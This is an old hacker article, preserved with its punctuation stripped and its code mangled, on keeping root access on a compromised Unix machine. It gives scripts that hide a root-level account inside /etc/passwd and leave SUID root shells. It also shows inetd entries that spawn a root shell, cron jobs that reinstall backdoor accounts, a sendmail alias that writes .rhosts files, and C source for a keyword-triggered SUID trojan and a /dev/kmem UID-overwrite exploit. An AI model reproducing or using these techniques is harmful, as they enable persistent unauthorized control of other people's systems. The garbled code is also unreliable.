ok   night trying exploit think system seems tight system look tight system tight tried everything default passwds guessable passwds ni weakness nfs hole incorrect permission race condition suid exploit sendmail bug  nothing wait   finally seeming endless toiling managed steal root hold onto precious superuser privilege worked hard achieve  article intended show hold onto root intended hacker administrator alike hacking perspective obvious good paper admin likewise benefit paper ever wonder pesky hacker always manages pop even think completely eradicated system list mean comprehensive many way leave backdoor unix computer way one beforehand know location critical system file obvious ca nt list top head stop reading get book unix read come back  familiarity passwd file format including general field format system specific naming convention shadowing mechanism etc  know vi many system robust userfriendly editor pico emacs vi also quite useful needing quickly seach edit large file connecting remotely via dialuptelnetrloginwhatver always nice robust terminal program nice fat scrollback buffer come handy want cut paste code rc file shell script etc  permenance backdoor depend completely technical saavy administrator experienced skilled administrator wise many backdoor managed steal root likely admin nt skilled date bug report many door may place time come one major thing aware fact cover track initial breakin one looking back door overt add uid account passwd file probably obvious quickly discovered method rentry fly red flag admin saying  attack  must advice simply prepend append anyone causally examining passwd file see stick middle  bincsh insert uid account middle passwd file likely way  line awk sed oh well daemon netcomcom set linecount wc l etcpasswd cd home cp etcpasswd temppass safety first echo passwd file linecount line linecount  linecount  want temp file echo creating two file linecount line approximately split linecount temppass passwd string optional echo  eviluser  mr sinister homesweethome bincsh  xaa cat xab xaa mv xaa etcpasswd chmod etcpasswd whatever beforehand rm xa temppass echo done  never ever change root password reason obvious similar vein enable disabled account uid sync perhaps account somwhere buried deep passwd file abandoned disabled sysadmin change uid remove  second field leave suid root shell tmp binsh everyone favorite  cp bincsh tmpevilnaughtyshell nt name  chmod tmpevilnaughtyshell many system run cron job clean tmp nightly system clean tmp upon reboot many system tmp mounted disallow suid program executing change filesystem start filling people may notice  hey overt section  detail change neccessary quite system specific check varspoolcroncrontabsroot etcfstab veiled superserver configuration file first place sysadmin look put one first background info internet daemon etcinetd listens connection request tcp udp port spawn appropriate program usally server connection request arrives format etcinetdconf file simple typical line look like ftp stream tcp nowait root usretcftpd ftpd talk dgram udp wait root usretcntalkd ntalkd field daemon name appear etcservices tell inetd look etcservices determine port associate program name tell inetd type socket connection daemon expect tcp us stream udp us datagrams field protocol field either two transport protocol tcp udp field specifies whether daemon iterative concurrent wait flag indicates server process connection make subsequent connection wait nowait mean server accept connection spawn child process handle connection go back sleep waiting connection field user inportantly uid daemon run program run connection arrives actual command optional argument program trivial usally requiring user interaction inetd may handle internally done internal flag field install handy backdoor choose service used often replace daemon would normally handle something else program creates suid root shell program add root account etcpasswd file etc  insinuationimpaired try open etcinetdconf available editor find line read daytime stream tcp nowait root internal change daytime stream tcp nowait binsh sh need restart etcinetd reread config file want kill restart process kill  usrsbininetd usretcinetd interuppt network connection good idea peak hour option compromising well known service would install new one run program choice one simple solution set shell run similar backdoor need make sure entry appears etcservices well etcinetdconf format etcservices file simple smtp tcp mail field service field port number protocol type service expects common name associated service instance add line etcservices evil tcp evil line etcinetdconf evil stream tcp nowait binsh sh restart inetd note potentially powerful backdoor offer local rentry account system offer rentry account computer internet cronbased trojan cron wonderful system administration tool also wonderful tool backdoor since root crontab well run root  depending level experience sysadmin implementation backdoor may may last varspoolcroncrontabsroot root list crontabs usally located several option list cronbased backdoor limited imagination cron clock daemon tool automatically executing command specified date time crontab command used add remove view crontab entry easy manually edit varspoolcrontabroot file use crontab crontab entry six field usrbinupdatedb field follows minute  hour  day month  month year  day week  field command shell script execute shell script executed monday exploit cron simply add entry varspoolcrontabroot example cronjob run daily look etcpasswd file uid account previously added add missing nothing otherwise may bad idea actually insert shell code already installed crontab entry shell script obfuscate shady intention add line varspoolcrontabroot usrbintrojancode shell script bincsh eviluser still system let make sure daemon netcomcom set evilflag grep eviluser etcpasswd evilflag  set linecount wc l etcpasswd cd home cp etcpasswd temppass safety first linecount  linecount  want temp file split linecount temppass passwd string optional echo  eviluser  mr sinister homesweethome bincsh  xaa cat xab xaa mv xaa etcpasswd chmod etcpasswd whatever beforehand rm xa temppass echo done  else endif cronbased trojan ii one brought attention mr zippy need copy etcpasswd file hidden somewhere hidden passwd file call varspoolmailsneaky one entry root account passwd choosing run cronjob every morning every morning save copy real etcpasswd file install trojan one real etcpasswd file one minute synchronize swatch normal user process trying login access etcpasswd file would get error one minute later everything would ok add line root crontab file binusrsneakysneakypasswd make sure exists echo  root operator bincsh  varspoolmailsneaky simple shell script bincsh install trojan etcpasswd file one minute daemon netcomcom cp etcpasswd etctemppass cp varspoolmailsneaky etcpasswd sleep mv etctemppass etcpasswd compiled code trojan simple idea instead shell script nice c code obfuscate effect make sure run root name something innocous hide well  little trojan create suid root shell proper argument given c code rather shell hide obvious effect   daemon netcomcom  include define keyword  industry  define buffersize int main argc argv int argc char argv int argv  got argument keyword  strcmp keyword argv  trojan part  system  cp bincsh binswp  system  chown root binswp  system  chmod binswp   put possibly system specific trojan message   let look like something   printf  sychronizing bitmap image record   system  l alr devnull devnull   fprintf stderr   sleep printf  ndonen  return  end main  sendmail alias file sendmail alias file allows mail sent particular username either expand several user perhaps pipe output program well known uudecode alias trojan simply add line  decode  usrbinuudecode  etcaliases file usally would create uuencoded rhosts file full pathname embedded bincsh create rhosts file note output stdout echo   tmpfile usrbinuuencode tmpfile rootrhosts next telnet desired site port simply fakemail decode use subject body uuencoded version rhosts file one liner faked however echo   usrbinuuencode rootrhosts mail decode targetcom creative wish case setup alias mailed run program choosing many previous script method employed covert trojan code common program rather sneaky method really detectable program tripwire idea simple insert trojan code source commonly used program useful program u case su login passwd already run suid root need permission modification general example would want obtaining correct sourcecode particular flavor unix backdooring note may always possible unix vendor generous thier sourcecode since code lengthy different many flavor include basic psuedocode get input input special hardcoded flag spawn evil trojan else input valid continue else quit error  complex difficult trojan nature done le line additional code esoteric devkmem exploit represents virtual system since kernel keep parameter memory possible modify memory machine change uid process requires devkmem readwrite permission following step executed open devkmem device seek page memory overwrite uid current process spawn csh inherit uid following program  kmem readable writable program change user uid gid   code originally appeared  unix security practical tutorial  modification daemon netcomcom  include include include include include include include define keyword  nomenclature  struct user userpage long address userlocation int main argc argv envp int argc char argv envp int count fd long lseek argv  got argument keyword  strcmp keyword argv fd open  devkmem  ordwr fd printf  read write devkmemn  perror argv exit userlocationaddress lseek fd userlocation userlocation printf  seek user pagen  perror argv exit countread fd userpage sizeof struct user count sizeof struct user printf  read user pagen  perror argv exit printf  current uid dn  userpageuruid printf  current gid dn  userpagegruid userpageuruid userpageurgid wherelseek fd userlocation userlocation printf  seek user pagen  perror argv exit write fd userpage char userpageuprocp char userpage execle  bincsh   bincsh    char envp  end main  include include include define lnull ldfile long address ldfile object syment symbol long idx objectldopen  unix  lnull object fprintf stderr  open unixn  exit ldtbread object idx symbol success idx strcmp  u  ldgetname object symbol fprintf stdout  user page x xn  symbolnvalue ldclose object return symbolnvalue fprintf stderr  read symbol table unixn  exit since previous code requires devkmem world accessable likely natural event need take care advice write shell script similar one change permission devkmem discrete amount time say minute restore original permission add source source chmod devkmem sleep nap minute chmod devkmem whatever infinity concept issue ii 